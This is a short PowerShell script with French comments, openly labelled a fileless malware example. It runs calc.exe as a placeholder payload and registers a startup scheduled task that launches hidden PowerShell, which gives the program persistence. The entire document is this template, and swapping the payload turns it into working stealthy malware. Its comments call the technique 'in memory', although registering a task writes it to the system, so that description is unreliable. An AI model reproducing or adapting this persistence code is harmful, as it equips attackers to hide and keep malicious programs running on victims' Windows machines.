# Script à exécuter en mémoire
$code = {
    # Code à exécuter, par exemple, ouvrir calc.exe
    Start-Process "calc.exe"

    # Persistance : Créer une tâche planifiée en mémoire
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command Start-Process 'calc.exe'"
    $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName "MemoryTask" -Description "Fileless Malware Example"
}
Invoke-Command -ScriptBlock $code
